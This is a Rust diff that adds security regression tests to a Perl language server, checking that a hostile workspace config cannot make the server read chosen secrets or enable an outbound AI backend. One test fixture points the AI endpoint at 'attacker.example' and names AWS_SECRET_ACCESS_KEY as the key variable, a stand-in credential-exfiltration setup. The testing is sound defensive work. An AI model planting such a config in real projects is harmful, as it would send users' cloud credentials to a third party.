@@ -603,6 +603,7 @@ impl LspServer {
         );
         provider_config.api_key_header = ai_config.api_key_header.clone();
         provider_config.api_key_prefix = ai_config.api_key_prefix.clone();
+        provider_config.local_model_mode = ai_config.local_model_mode;
 
         let limiter = Arc::new(perl_lsp_rs_core::providers::ai::RateLimiter::new(
             ai_config.rate_limit_rps,
@@ -1768,6 +1769,104 @@ mod tests {
         );
     }
 
+    /// Security regression (issue #4955): a workspace-chosen `api_key_env`
+    /// must not cause a differently-named environment variable to be read.
+    /// A hostile `.perl-lsp.toml` cannot set `api_key_env` at all any more
+    /// (`perl_lsp_rs_core::config::ProjectAiCompletionConfig` no longer has
+    /// the field), so the `AiCompletionConfig` that reaches
+    /// `resolve_ai_api_key_with` can only ever carry the default or a value
+    /// the *user* configured. This test proves that end-to-end: it runs a
+    /// hostile project TOML through `apply_to_server_config`, then calls
+    /// `resolve_ai_api_key_with` with an injected `read_env` that records
+    /// every name it is asked for, and asserts the attacker-chosen name is
+    /// never among them.
+    #[test]
+    fn resolve_ai_api_key_with_never_reads_workspace_chosen_env_var_name()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let temp = tempfile::tempdir()?;
+        std::fs::write(
+            temp.path().join(".perl-lsp.toml"),
+            r#"
+[ai_completion]
+enabled = true
+endpoint = "https://attacker.example/v1/chat/completions"
+api_key_env = "AWS_SECRET_ACCESS_KEY"
+"#,
+        )?;
+        let project = perl_lsp_rs_core::config::load_project_config(temp.path())?
+            .ok_or("expected parsed project config")?;
+
+        let mut server_config = perl_lsp_rs_core::config::ServerConfig::default();
+        project.apply_to_server_config(&mut server_config);
+
+        let mut requested_names: Vec<String> = Vec::new();
+        let read_env = |name: &str| -> Option<String> {
+            requested_names.push(name.to_string());
+            None
+        };
+        LspServer::resolve_ai_api_key_with(&server_config.ai_completion, read_env);
+
+        assert!(
+            !requested_names.contains(&"AWS_SECRET_ACCESS_KEY".to_string()),
+            "attacker-chosen api_key_env must never be read; requested names were {requested_names:?}",
+        );
+        // The negative assertion alone would pass vacuously if key resolution
+        // ever short-circuited and never consulted the environment at all. Pin
+        // that the trusted (user/default) name really was the one queried, so
+        // this stays a proof about *which* name is read rather than a proof
+        // that nothing was read.
+        assert!(
+            requested_names.contains(&server_config.ai_completion.api_key_env),
+            "the effective (user/default) api_key_env must be the name actually read; \
+             requested names were {requested_names:?}",
+        );
+        Ok(())
+    }
+
+    /// Security regression (issue #4997): a hostile `.perl-lsp.toml` must not
+    /// be able to install an outbound AI backend on its own — even when a
+    /// default API key is present in the environment.
+    #[test]
+    fn hostile_project_config_cannot_install_ai_backend_without_user_enable()
+    -> Result<(), Box<dyn std::error::Error>> {
+        const KEY_ENV: &str = "OPENAI_API_KEY";
+        let _env_guard = AiTestEnvGuard::set(KEY_ENV, "sk-test-key")?;
+
+        let temp = tempfile::tempdir()?;
+        std::fs::write(
+            temp.path().join(".perl-lsp.toml"),
+            r#"
+[ai_completion]
+enabled = true
+provider = "openai"
+model = "gpt-4"
+"#,
+        )?;
+
+        let server = LspServer::new();
+        let workspace_uri =
+            url::Url::from_directory_path(temp.path()).map_err(|_| "bad folder uri")?.to_string();
+        {
+            let mut folders = server.workspace_folders.lock();
+            folders.push(
+                WorkspaceFolderState::new(workspace_uri).with_path(temp.path().to_path_buf()),
+            );
+        }
+
+        server.load_and_apply_project_config();
+        server.refresh_ai_backend();
+
+        assert!(
+            server.ai_backend().is_none(),
+            "project config alone must not install an outbound AI backend",
+        );
+        assert!(
+            !server.config.lock().ai_completion.enabled,
+            "effective AI must remain disabled without user authorization",
+        );
+        Ok(())
+    }
+
     #[test]
     fn refresh_ai_backend_installs_connector_auth_backend() -> Result<(), Box<dyn std::error::Error>>
     {
@@ -1778,6 +1877,7 @@ mod tests {
         {
             let mut config = server.config.lock();
             config.ai_completion = AiCompletionConfig {
+                user_enabled: true,
                 enabled: true,
                 endpoint: "https://connector.example/v1/chat/completions".to_string(),
                 model: "custom-code-model".to_string(),
